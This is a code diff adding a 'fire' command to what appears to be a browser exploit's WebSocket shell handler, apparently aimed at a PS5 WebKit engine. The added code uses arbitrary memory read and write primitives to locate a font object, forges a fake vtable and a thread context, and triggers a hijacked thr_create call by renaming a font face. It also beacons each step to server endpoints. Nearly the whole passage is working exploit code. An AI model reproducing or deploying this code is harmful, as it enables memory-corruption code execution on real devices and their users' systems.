@@ -6165,6 +6165,132 @@ function _startWsShell(){
         break;
       }
 
+      case 'fire':{
+        /* *** THE DISPATCH-FIRE (session-180 design) *** the parent-survival
+         * route: ZigZagBoi1's RIP2-AFTER mechanism - fire thr_create via the
+         * FONTCHANGED VTABLE DISPATCH instead of the rawcall. The C++ call
+         * site's RSI is NOT cfr (the rawcall fire's death: the kernel honors
+         * id=RSI=cfr, the tid write killed the JS at the Math.round return).
+         * THE CHAIN: the walk (MBUF->L1->IM->m_ptr@+0x10->FO->VP) -> FAKEVT
+         * (copy VP's slots incl. the RTTI precede, swap ONLY s3 = the
+         * fontStateChanged slot = +0x18 the PS5-fork) -> the gates at
+         * FO+0xC0..+0x118 (the kernel reads the ucontext at RDI=FO) +
+         * FO+0x48 = the child RDI = the witness -> THE SWAP: FO+0x00 :=
+         * FAKEVT (the cage is writable; the real VP in RELRO stays intact)
+         * -> THE TRIGGER: rename a face in document.fonts (the boot's own
+         * FAMILY-OK op) -> the engine iterates the face's clients -> calls
+         * FO->fontStateChanged() = [FAKEVT+0x18] = lk+0x13ED0 with RDI=FO ->
+         * *** THR_CREATE(FO-as-ctx, RSI=the C++ site's value, RDX=?) *** ->
+         * the child: RIP=lk+0x2C0 (thr_self: writes ITS OWN tid at
+         * [RDI=FO+0x48=witness]) -> ret -> [RSP=child stack]=lk+0x3F0
+         * (thr_exit, the clean exit) -> the parent: RIP2-AFTER (their
+         * proof: the dispatch RETURNS, execution continues) -> setTimeout ->
+         * read the witness -> THE REPLY CARRIES THE CHILD'S TID. */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function FB2(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('FIRE-'+s),false);x.send();}catch(e){}}
+        try{
+          var cfrF2=S.cfr;
+          /* (1) the lk chain */
+          var lkF=0n;
+          {
+            var entF=S.absRead(0x10001c8000n,0x100);
+            var trF=0n;
+            for(var eF=0;eF<entF.length;eF++){if(entF[eF]>=0x10001f0000n&&entF[eF]<0x1000200000n){trF=entF[eF];break;}}
+            if(trF===0n){reply.err='no thread-record ptr';break;}
+            var trrF=S.absRead(trF,0x60);
+            var ptF=0n;
+            for(var tF=0;tF<trrF.length;tF++){if(trrF[tF]>=0x880000000n&&trrF[tF]<0x900000000n){ptF=trrF[tF];break;}}
+            if(ptF===0n){reply.err='no pthread ptr';break;}
+            var ndF=ptF,qF=0n;
+            for(var hF=0;hF<5;hF++){
+              var ppF=S.absRead(ndF,0x60);
+              qF=ppF[8];
+              if((qF&0x3fffn)===0x218n&&qF>0x800000000n)break;
+              ndF=qF-0x38n;
+            }
+            if((qF&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+            lkF=qF-0x6C218n;
+            var canF=S.absRead(lkF+0x751D0n,8)[0];
+            FB2('1 lk=0x'+lkF.toString(16)+' canary=0x'+canF.toString(16));
+            if(!(canF>0x1000000n)){reply.err='canary fail';break;}
+          }
+          reply.lk='0x'+lkF.toString(16);
+          /* (2) the walk: MBUF -> L1 -> IM -> m_ptr@+0x10 -> FO -> VP */
+          var MBUF=0n;
+          try{MBUF=BigInt('0x'+(localStorage.getItem('v688_buf')||'0'));}catch(eM2){}
+          if(!(MBUF>=0x1000000000n)){reply.err='no MBUF';break;}
+          var L1=S.absRead(MBUF+0x58n,8)[0];
+          FB2('2 mbuf=0x'+MBUF.toString(16)+' L1=0x'+L1.toString(16));
+          if(!(L1>=0x1000000000n&&L1<0x1010000000n)){reply.err='L1 band fail';break;}
+          var ht=S.absRead(L1-0x10n,0x50);
+          var IM=0n,FO=0n,VP=0n;
+          for(var bI=0;bI<ht.length;bI++){
+            var bv=ht[bI];
+            if(bv<0x1000000000n||bv>=0x1010000000n)continue;
+            var w2=S.absRead(bv,0x18);
+            var FOc=w2[2];
+            if(FOc<0x1000000000n||FOc>=0x1010000000n)continue;
+            var VPc=S.absRead(FOc,8)[0];
+            if(VPc<0x800000000n||VPc>=0x880000000n)continue;
+            IM=bv;FO=FOc;VP=VPc;break;
+          }
+          if(!FO){reply.err='walk fail (no chain)';break;}
+          FB2('3 IM=0x'+IM.toString(16)+' FO=0x'+FO.toString(16)+' VP=0x'+VP.toString(16));
+          reply.FO='0x'+FO.toString(16);reply.VP='0x'+VP.toString(16);
+          /* (3) FAKEVT: copy VP-0x10..VP+0x38 (the RTTI precede + 6 slots + NULL), swap s3 (+0x18) */
+          var FAKEVT=MBUF+0x4000n;
+          for(var cI=0;cI<9;cI++)S.absWrite(FAKEVT+BigInt(cI*8),S.absRead(VP-0x10n+BigInt(cI*8),8)[0]);
+          S.absWrite(FAKEVT+0x18n,lkF+0x13ED0n);   /* s3 = fontStateChanged (the PS5-fork +0x18) */
+          FB2('4 FAKEVT=0x'+FAKEVT.toString(16)+' s3=0x'+(lkF+0x13ED0n).toString(16));
+          /* (4) the witness + the child stack */
+          var WIT=MBUF+0x3000n;
+          var STK=MBUF+0x2F00n;
+          S.absWrite(STK,lkF+0x3F0n);              /* the child stack top = thr_exit stub */
+          var witPre=S.absRead(WIT,8)[0];
+          /* (5) THE GATES at FO (the kernel reads the ucontext at RDI=FO) */
+          var vpOrig=S.absRead(FO,8)[0];
+          S.absWrite(FO+0x048n,WIT);               /* the child RDI = the witness */
+          S.absWrite(FO+0x0C0n,0x43n);             /* CS */
+          S.absWrite(FO+0x0D0n,0n);                /* flags */
+          S.absWrite(FO+0x0E0n,lkF+0x2C0n);        /* the child RIP = the thr_self stub */
+          S.absWrite(FO+0x0F0n,0x202n);            /* RFLAGS */
+          S.absWrite(FO+0x0F8n,STK);               /* the child RSP */
+          S.absWrite(FO+0x100n,0x3Bn);             /* SS */
+          S.absWrite(FO+0x108n,0x480n);            /* magic */
+          S.absWrite(FO+0x110n,0x10002n);          /* type */
+          S.absWrite(FO+0x118n,0x20001n);          /* subtype */
+          FB2('5 gates at FO set, witness=0x'+WIT.toString(16)+' pre=0x'+witPre.toString(16));
+          /* (6) THE SWAP: FO+0x00 := FAKEVT */
+          S.absWrite(FO,FAKEVT);
+          FB2('6 SWAPPED FO.vtable=0x'+FAKEVT.toString(16)+' (was 0x'+vpOrig.toString(16)+')');
+          /* (7) THE TRIGGER: rename a face in document.fonts (the boot's own op) */
+          var facesArr=[];
+          try{document.fonts.forEach(function(f){facesArr.push(f);});}catch(eD){}
+          FB2('7 faces n='+facesArr.length);
+          var fired=false;
+          for(var rI=0;rI<facesArr.length;rI++){
+            try{facesArr[rI].family='fy'+(Date.now()%1000);fired=true;break;}catch(eR2){}
+          }
+          FB2('8 trigger fired='+(fired?'YES':'NO'));
+          /* (8) the readback (setTimeout so the engine settles; the dispatch
+           * may be synchronous - read immediately too) */
+          var witPost=S.absRead(WIT,8)[0];
+          FB2('9 witness imm 0x'+witPre.toString(16)+' -> 0x'+witPost.toString(16));
+          reply.witness={pre:'0x'+witPre.toString(16),post:'0x'+witPost.toString(16)};
+          reply.vpOrig='0x'+vpOrig.toString(16);
+          if(witPost!==witPre){FB2('A *** WITNESS CHANGED - THE CHILD RAN ***');reply.spawned=true;}
+          setTimeout(function(){
+            try{
+              var wit2=S.absRead(WIT,8)[0];
+              var fd2={witness:'0x'+wit2.toString(16)};
+              FB2('B settled witness=0x'+wit2.toString(16));
+              try{var x2=new XMLHttpRequest();x2.open('POST','/api/result',false);x2.send(JSON.stringify({type:'result',fireSettled:fd2}));}catch(eX2){}
+            }catch(eS2){}
+          },500);
+        }catch(eZ2){reply.err='fire fault: '+String(eZ2&&eZ2.message?eZ2.message:'?');}
+        break;
+      }
+
       case 'lcbase':{
         /* v9 THE LIVE-POINTER HUNT (session-169 lessons: the WeakPtr
          * m_ptr is at +0x10 NOT +0x8 (their geometry doc: +0x00
